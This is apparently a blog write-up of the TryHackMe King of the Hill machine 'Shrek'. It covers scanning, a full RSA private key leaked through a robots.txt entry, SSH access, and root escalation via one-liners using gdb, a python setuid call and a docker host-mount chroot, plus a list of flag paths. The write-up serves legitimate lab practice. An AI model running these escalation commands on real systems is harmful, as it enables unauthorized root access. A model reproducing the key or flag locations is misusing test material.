---
layout: post
title: TryHackMe KoTH - Shrek 
author: trevohack
date: 2023-08-19 11:33:00 +0800 
categories: [TryHackMe]
tags: [hacking, koth, linux, ssh, privesc, thm]
pin: true
math: true
mermaid: true
---


# Initial Nmap Scan

```bash
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.2
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.1.33)
3306/tcp open  mysql   MySQL (unauthorized)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
9999/tcp open  abyss?
```

> `/Cpxtpt2hWCee9VFa.txt` Abnormal text file 

# Initial Gobuster Scan

```bash
/upload (Status: 301)
/cms (Status: 301)
/api (Status: 301)
/robots.txt (Status: 200)
```

> Robots.txt found! 

```text
User-agent: *
Disallow: /Cpxtpt2hWCee9VFa.txt
``` 

# Method 1

### Content In  `/Cpxtpt2hWCee9VFa.txt`

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAsKHyvIOqmETYwUvLDAWg4ZXHb/oTgk7A4vkUY1AZC0S6fzNE
JmewL2ZJ6ioyCXhFmvlA7GC9iMJp13L5a6qeRiQEVwp6M5AYYsm/fTWXZuA2Qf4z
8o+cnnD+nswE9iLe5xPl9NvvyLANWNkn6cHkEOfQ1HYFMFP+85rmJ2o1upHkgcUI
ONDAnRigLz2IwJHeZAvllB5cszvmrLmgJWQg2DIvL/2s+J//rSEKyISmGVBxDdRm
T5ogSbSeJ9e+CfHtfOnUShWVaa2xIO49sKtu+s5LAgURtyX0MiB88NfXcUWC7uO0
Z1hd/W/rzlzKhvYlKPZON+J9ViJLNg36HqoLcwIDAQABAoIBABaM5n+Y07vS9lVf
RtIHGe4TAD5UkA8P3OJdaHPxcvEUWjcJJYc9r6mthnxF3NOGrmRFtDs5cpk2MOsX
u646PzC3QnKWXNmeaO6b0T28DNNOhr7QJHOwUA+OX4OIio2eEBUyXiZvueJGT73r
I4Rdg6+A2RF269yqrJ8PRJj9n1RtO4FPLsQ/5d6qxaHp543BMVFqYEWvrsdNU2Jl
VUAB652BcXpBuJALUV0iBsDxbqIKFl5wIsrTNWh+hkUTwo9HroQEVd4svCN+Jr5B
Npr81WG2jbKqOx2kJVFW/yCivmr/f/XokyOLBi4N/5Wqq+JuHD0zSPTtY5K04SUd
63TWQ5kCgYEA32IwfmDwGZBhqs3+QAH7y46ByIOa632DnZnFu2IqKySpTDk6chmh
ONSfc4coKwRq5T0zofHIKLYwO8vVpJq4iQ31r+oe7fAHh08w/mBC3ciCSi6EQdm5
RMxW0i4usAuneJ04rVmWWHepADB0BqYiByWtWFYAY9Kpks/ks9yWHn8CgYEAymxD
q3xvaWFycawJ+I/P5gW8+Wr1L3VrGbBRj1uPhNF0yQcA03ZjyyViDKeT/uBfCCxX
LPoLmoLYGmisl/MGq3T0g0TtrgvkFU6qZ3sjYJ+O/yrT06HYapJLv6Ns/+98uNvi
3VEQodZNII8P6WLk3RPp1NzDVcFDLmD9C40UAQ0CgYBokPgOUKZT8Sgm4mJ/5+3M
LZtHF4PvdEOmBJNw0dTXeUPesHNRcfnsNmulksEU0e6P/IQs7Jc7p30QoKwTb3Gu
hmBZxohP7So5BrLygHEMjI2g2AGFKbv2HokNvhyQwAPXDBG549Pi+bCcrBHEAwSu
v85TKX7pO3WxiauPHlUPVQKBgFmIF0ozKKgIpPDoMiTRnxfTc+kxyK6sFanwFbL9
wXXymuALi+78D1mb+Ek2mbwDC6V2zzwigJ1fwCu2Hpi6sjmF6lxhUWtI8SIHgFFy
4ovrJvlvvO9/R1SjzoM9yolNKPIut6JCJ8QdIFIFVPlad3XdR/CRkIhOieNqnKHO
TYnFAoGAbRrJYVZaJhVzgg7H22UM+sAuL6TR6hDLqD2wA1vnQvGk8qh95Mg9+M/X
6Zmia1R6Wfm2gIGirxK6s+XOpfqKncFmdjEqO+PHr4vaKSONKB0GzLI7ZlOPPU5V
Q2FZnCyRqaHlYUKWwZBt2UYbC46sfCWapormgwo3xA8Ix/jrBBI=
-----END RSA PRIVATE KEY-----
```

> Private RSA Key Found On  `/Cpxtpt2hWCee9VFa.txt`

I tried to find the user didn't manage though, I took a random guess and did `shrek`

```bash
sshpass -p '' ssh -i id_rsa shrek@10.10.8.160 
``` 

## Privilege Escalation

I ran `linpeas.sh` on the machine and got an interesting binary: `gdb`

```bash
[ shrek@shrek.thm ]~$ ./linpeas.sh

[+] SGID 

/usr/bin/wall
/usr/bin/write
/usr/bin/gdb
/usr/bin/run-parts
/usr/bin/ssh-agent
/usr/sbin/netreport
/usr/sbin/postdrop
/usr/sbin/postqueue
/usr/libexec/utempter/utempter 
/usr/libexec/openssh/ssh-keysign
``` 

After going through: `gtobins`, I found this to gain root:

```bash
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
``` 

Running `id` will show you some confusing output. This would be a one-liner to fix it:

```python
python -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
```

# Method 2 

On a high port (random most times) runs a bind shell for user `puss`

```bash
# Check for SUIDS
find / -perm -4000 -type f

# Binaries that can be run as sudo
sudo -l

# Check for groups
groups puss # Reveals that user puss is in the docker group

# PrivEsc
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
``` 

# Successfully Rooted The Box Shrek

# Flags

* /root/root.txt
* /home/shrek/flag.txt
* /srv/web/flag.txt
* /var/lib/docker/overlay2/8039e912cd29e964102163c37a1f05795ea99e7da6c1a800dd9749417d88c680/diff/root/flag.txt
* /home/donkey/flag.txt
* /home/puss/flag.txt
  
# Thank You!! 
